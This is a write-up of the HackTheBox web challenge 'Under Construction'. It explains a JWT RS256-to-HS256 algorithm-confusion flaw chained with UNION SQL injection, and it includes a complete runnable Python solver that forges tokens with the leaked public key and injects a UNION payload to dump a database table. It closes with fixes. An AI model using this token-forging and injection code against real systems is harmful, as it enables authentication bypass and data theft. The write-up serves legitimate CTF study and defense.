---
title: "Under Construction"
date: 2027-11-30 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, algorithm-confusion, sqli, union-injection, cwe-347, cwe-89]
description: "A Medium Web challenge: a JWT verifier accepts both RS256 and HS256 with the public key — and hands that public key to every client — so you forge an HS256 token with the public key as the HMAC secret, then ride an unsanitized claim into UNION SQL injection to read the flag table."
---

## Overview

**Under Construction** is a Medium HackTheBox **Web** challenge. It's a small Node/Express + SQLite
app whose only page tells you the site is "under development." The path to the flag is a two-bug chain:
a [JWT algorithm-confusion](https://cwe.mitre.org/data/definitions/347.html) flaw lets you forge an
arbitrary session token without any private key, and a forged token's `username` claim flows straight
into a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) that the legitimate login path
had quietly sanitized.

## The technique

### Bug 1 — JWT RS256 → HS256 algorithm confusion ([CWE-347](https://cwe.mitre.org/data/definitions/347.html))

The token helper signs with RS256 but its verifier accepts **both** RS256 and HS256, using the same
public key as the key:

```js
async sign(data) {
    data = Object.assign(data, { pk: publicKey });     // public key shipped INSIDE every token
    return jwt.sign(data, privateKey, { algorithm: 'RS256' });
},
async decode(token) {
    return jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });  // <-- HS256 also OK
}
```

RS256 verifies an RSA signature with a **public** key (you'd need the private key to sign). But HS256
is symmetric — the "key" is an HMAC secret used for **both** signing and verifying. When a forged token
declares `alg: HS256`, the library treats `publicKey` as that secret. The public key is public — and
here it is literally handed to every client inside the `pk` claim — so an attacker can compute a valid
HMAC and forge any claims they like.

### Bug 2 — UNION SQL injection via the forged claim ([CWE-89](https://cwe.mitre.org/data/definitions/89.html))

The home route reads the username from the token and looks it up with raw string interpolation:

```js
getUser(username){
    db.get(`SELECT * FROM users WHERE username = '${username}'`, ...)   // raw interpolation
}
```

The **login** route strips quotes before signing a token — but a self-forged token never goes through
that path, so the `username` claim reaches the query unsanitized.

## Solution

1. Register and log in once to obtain a legitimate RS256 token, and read the public-key PEM out of its
   `pk` claim — that's the future HMAC secret.
2. Hand-build an HS256 token (PyJWT refuses to use a public key as an HMAC secret, so we sign manually
   with `hmac`), placing a UNION-injection payload in the `username` claim.
3. The `users` table has three columns; the **second** one renders as `{{ user.username }}` on the home
   page, so the UNION pushes the flag into that column.

The full, runnable solver:

```python
import sys, json, base64, requests, hmac, hashlib

BASE = f"http://{sys.argv[1]}"

def b64url_dec(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64url_enc(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

# 1. one legit token -> harvest the embedded public key (the future HMAC secret)
s = requests.Session()
s.post(f"{BASE}/auth", data={"username":"u","password":"p","register":"1"}, allow_redirects=False)
s.post(f"{BASE}/auth", data={"username":"u","password":"p"}, allow_redirects=False)
token  = s.cookies.get("session")
pubkey = json.loads(b64url_dec(token.split(".")[1]))["pk"]      # PEM with real newlines

# 2. hand-build an HS256 token whose HMAC secret is that public key
def forge(username):
    hdr = b64url_enc(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
    pl  = b64url_enc(json.dumps({"username":username,"pk":pubkey}, separators=(",",":")).encode())
    si  = hdr + b"." + pl
    sig = hmac.new(pubkey.encode(), si, hashlib.sha256).digest()
    return (si + b"." + b64url_enc(sig)).decode()

def query(sqli):
    r = requests.get(f"{BASE}/", cookies={"session": forge(sqli)})
    return r.text.split("Welcome ",1)[1].split("<br>",1)[0].strip() if "Welcome " in r.text else r.text[:200]

# 3. users has 3 cols; column 2 renders as {{ user.username }}
flag = query("' UNION SELECT 1,(SELECT group_concat(top_secret_flaag) FROM flag_storage),3-- -")
import html; print(html.unescape(flag))
```

Run it against the instance:

```bash
python3 solve.py <host:port>
```

It dumps the schema (`flag_storage(id, top_secret_flaag)`) and prints the flag — `HTB{...}`.

## Why it worked

Accepting an asymmetric *and* a symmetric algorithm in one verifier turns a **public** key into a
forgeable HMAC secret. Shipping that public key inside the token removed even the small effort of
fetching it. And because input sanitization was applied only on the legitimate signing path, the moment
you can mint your own token, the unsanitized `username` claim becomes a clean injection point.

## Fix / defense

- **Pin a single algorithm:** `jwt.verify(token, publicKey, { algorithms: ['RS256'] })`. Never accept an
  asymmetric and a symmetric algorithm together with the same key.
- **Never embed the verification key in the token** — the `pk` claim hands the attacker the HMAC secret.
- **Parameterize the query.** The same codebase already does it correctly elsewhere
  (`db.get('... = ?', username)`); `getUser` simply forgot.
